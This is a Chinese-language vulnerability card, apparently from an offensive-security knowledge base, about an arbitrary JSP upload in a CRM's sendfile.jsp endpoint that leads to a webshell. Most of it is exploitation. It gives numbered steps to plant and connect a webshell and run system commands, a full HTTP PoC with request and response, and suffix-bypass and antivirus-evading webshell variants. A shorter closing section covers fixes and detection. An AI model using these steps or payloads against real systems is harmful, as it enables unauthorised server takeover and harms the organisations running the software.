---
id: web-generic-file-upload-crm-sendfile-jsp-preserve-suffix
title: CRM sendfile.jsp 保留原始后缀上传 JSP（文件名尾空格）直接落地 WebShell
type: scenario
domain: web
path: web/generic/file-upload
technique: crm-sendfile-jsp-upload-preserve-suffix
aliases:
- sendfile.jsp 任意文件上传
- importdata 上传 JSP
- 尾空格文件名绕过
- CRM getshell
- metasoft CRM 文件上传
tags:
- java
- jsp
- file-upload
- webshell
- crm
- web
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T09:12:52+08:00'
  notes: 已对照原文及17张图核对：图07 sendfile.jsp 取 getFiles().getFile(0).getFileName() 作为 affix，取最后一个 . 之后的后缀拼到 UUID 上并 saveAs 到 Path.getUserFile()+temp；图08 请求 /userfile/default/temp/a86e375a93489b59bd7908aeeba53d0b.jsp 返回 200/4 字节 111，JSP 已执行。卡内尾空格说明（filename=1.jsp + 空格，Windows 落盘去尾空格）与请求/落盘 URL 一致。原文未展示鉴权，卡已注明按可达处理。原文无产品版本，未设 affected_versions。PoC 未在本机执行。
---

## 一句话结论

CRM 的 `/business/common/importdata/sendfile.jsp` 接收上传文件后只保留原始后缀、不做任何扩展名/内容校验，文件名由 UUID + 原后缀组成；上传 `1.jsp `（带尾空格）后文件落到 `/userfile/default/temp/<uuid>.jsp`，直接访问即执行 JSP，获得 WebShell。

## 原理

- **后缀原样保留**：`String affix = myUpload.getFiles().getFile(0).getFileName();`，随后 `if (affix.indexOf(".") != -1) fieldID += affix.substring(affix.lastIndexOf("."));`；即取上传文件名的最后一个 `.` 之后全部字符作为后缀，没有白名单。
- **文件名随机化不等于安全**：`fieldID = UUID.getID()` 加后缀，攻击者不能覆盖已有文件，但可以决定后缀；`myUpload.saveAs(path, fieldID)` 把文件写入 `Path.getUserFile() + "temp" + File.separator`，该目录被 Web 容器映射为 `/userfile/default/temp/`。
- **JSP 可执行**：Tomcat/Apache Coyote 将 `.jsp` 交给 JSP 引擎编译执行；原文上传的 JSP 内容为 `<% out.println(111); %>`，访问返回 `111`，证明代码被执行。
- **尾空格**：原文 multipart 的 `filename="1.jsp "` 带一个尾空格，用于绕过可能存在的简单后缀黑名单/末尾匹配；实际落盘 URL 为 `.jsp`，说明保存时空格被去掉或被容器解析忽略。该细节依赖具体上传组件，核心仍是后缀未校验。
- **原文验证**：文章展示上传后直接请求 `/userfile/default/temp/a86e375a93489b59bd7908aeeba53d0b.jsp`，HTTP 200、响应体 `111`，为完整利用链。

## 触发条件

- 目标部署该 CRM 的 `business/common/importdata/sendfile.jsp`，且该 JSP 可被访问（原文未展示鉴权，按可达处理）。
- 上传文件保存目录位于 Web 根/静态映射内，且 Tomcat 对 `.jsp` 正常解析（未被全局禁用 JSP 或上传目录单独配置 `readonly`）。
- 上传组件保留原始后缀，未做白名单/魔数校验。
- 目标未部署上传目录禁止脚本执行的策略。

## 利用步骤

1. 访问 `/business/common/importdata/sendfile.jsp`，构造 multipart 上传，文件名用 `1.jsp `（或 `1.jsp`，视组件对尾空格的处理）。
2. 文件内容写 JSP 代码，例如 `<% out.println(111); %>` 或冰蝎/哥斯拉等加密 WebShell。
3. 从响应/目录规律推断保存路径：`/userfile/default/temp/<32位UUID>.jsp`。
4. 直接请求该 URL，确认返回命令/标记内容；随后用 WebShell 管理工具连接或执行系统命令。
5. 若 UUID 不可见，可上传后遍历/爆破目录、结合响应中的文件名或错误信息定位。

## PoC

```http
POST /business/common/importdata/sendfile.jsp HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.jsp "

<% out.println(111); %>
------WebKitFormBoundary--
```

访问上传结果：

```http
GET /userfile/default/temp/a86e375a93489b59bd7908aeeba53d0b.jsp HTTP/1.1
Host: target
```

```http
HTTP/1.1 200 OK
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 4

111
```

## 变体与关联

- **后缀变体**：`.jspx`、`.jspf`、`.jsp;`、`.jsp%00`、大小写 `.JSP` 等，视容器解析与过滤规则；`filename="1.jsp "` 只是原文使用的绕过形式。
- **内容变体**：明文命令马易被查杀时可换成加密 WebShell（冰蝎/哥斯拉）或 Base64/反射加载。
- **路径变体**：若 `Path.getUserFile()` 可配置到其他 Web 目录，落地 URL 随之变化；可结合目录穿越/错误回显定位。
- **关联**：Spring UUID 重命名保留原后缀上传、扩展名零校验上传、JSP 解析/上传目录可执行等卡片；根因相同：随机文件名 + 保留后缀 + 可执行目录。

## 检测与防御

- **修复**：服务端按白名单校验扩展名（仅 xlsx/csv 等导入类型）+ 文件魔数；上传文件重命名为无后缀或固定后缀；上传目录移出 Web 根，或禁止脚本解析（Tomcat `readonly`/`deny`、Nginx `location` 不转发 JSP）。
- **鉴权**：上传接口增加登录与权限校验，限制可上传用户；对 `sendfile.jsp` 这类历史接口做下线/收敛。
- **检测**：上传目录出现 `.jsp/.jspx` 文件；访问 `/userfile/**/*.jsp` 的请求；上传后短时间内同一 IP 访问新文件；JSP 内容含 `out.println`、`Runtime`、`ProcessBuilder`、冰蝎/哥斯拉特征。
- **排查**：检查 `/userfile/default/temp/` 等上传目录的可疑文件与创建时间，比对业务正常导入文件类型；发现 Webshell 后隔离、删除并排查横向。
